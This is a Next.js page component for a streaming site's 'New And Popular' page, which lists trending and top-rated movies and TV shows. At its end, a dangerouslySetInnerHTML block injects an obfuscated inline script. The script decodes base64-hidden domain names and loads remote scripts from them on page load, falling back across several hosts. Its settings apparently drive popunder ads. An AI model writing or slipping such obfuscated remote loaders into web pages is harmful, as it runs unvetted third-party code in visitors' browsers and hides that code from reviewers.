import Hero from '@/components/hero';
import ShowsContainer from '@/components/shows-container';
import { siteConfig } from '@/configs/site';
import { RequestType, type ShowRequest } from '@/enums/request-type';
import { getRandomShow } from '@/lib/utils';
import MovieService from '@/services/MovieService';
import { MediaType, type Show } from '@/types';
import Script from 'next/script';

export const revalidate = 3600;

export default async function NewAndPopularPage() {
  const h1 = `${siteConfig.name} New And Popular`;
  const requests: ShowRequest[] = [
    {
      title: 'Netflix',
      req: { requestType: RequestType.NETFLIX, mediaType: MediaType.TV },
      visible: false,
    },
    {
      title: 'Trending TV Shows',
      req: { requestType: RequestType.TRENDING, mediaType: MediaType.TV },
      visible: true,
    },
    {
      title: 'Trending Movies',
      req: { requestType: RequestType.TRENDING, mediaType: MediaType.MOVIE },
      visible: true,
    },
    {
      title: 'Top Rated TV Shows',
      req: { requestType: RequestType.TOP_RATED, mediaType: MediaType.TV },
      visible: true,
    },
    {
      title: 'Top Rated Movies',
      req: { requestType: RequestType.TOP_RATED, mediaType: MediaType.MOVIE },
      visible: true,
    },
  ];
  const allShows = await MovieService.getShows(requests);
  const randomShow: Show | null = getRandomShow(allShows);

  return (
    <>
      <h1 className="hidden">{h1}</h1>
      <Hero randomShow={randomShow} />
      <ShowsContainer shows={allShows} />
<div
        dangerouslySetInnerHTML={{
          __html: `
    <script type="text/javascript" data-cfasync="false">
/*<![CDATA[/* */
(function(){var t=window,m="c2558032fd6c75a989091d04a363dcf9",x=[["siteId",710+477+771+600+5063095],["minBid",0],["popundersPerIP","30:1,10"],["delayBetween",9],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],j=["d3d3LmludGVsbGlwb3B1cC5jb20vcXNtb2tlLm1pbi5jc3M=","ZDNtcjd5MTU0ZDJxZzUuY2xvdWRmcm9udC5uZXQvQVUvc2Jhc2UuanM=","d3d3LnFmd2Vpb3J0LmNvbS9mc21va2UubWluLmNzcw==","d3d3LnN6cXhucGNxbnpsLmNvbS9kdS9zYmFzZS5qcw=="],i=-1,v,d,l=function(){clearTimeout(d);i++;if(j[i]&&!(1756576170000<(new Date).getTime()&&1<i)){v=t.document.createElement("script");v.type="text/javascript";v.async=!0;var s=t.document.getElementsByTagName("script")[0];v.src="https://"+atob(j[i]);v.crossOrigin="anonymous";v.onerror=l;v.onload=function(){clearTimeout(d);t[m.slice(0,16)+m.slice(0,16)]||l()};d=setTimeout(l,5E3);s.parentNode.insertBefore(v,s)}};if(!t[m]){try{Object.freeze(t[m]=x)}catch(e){}l()}})();
/*]]>/* */
</script>


   
          `,
        }}
      />    </>
  );
}
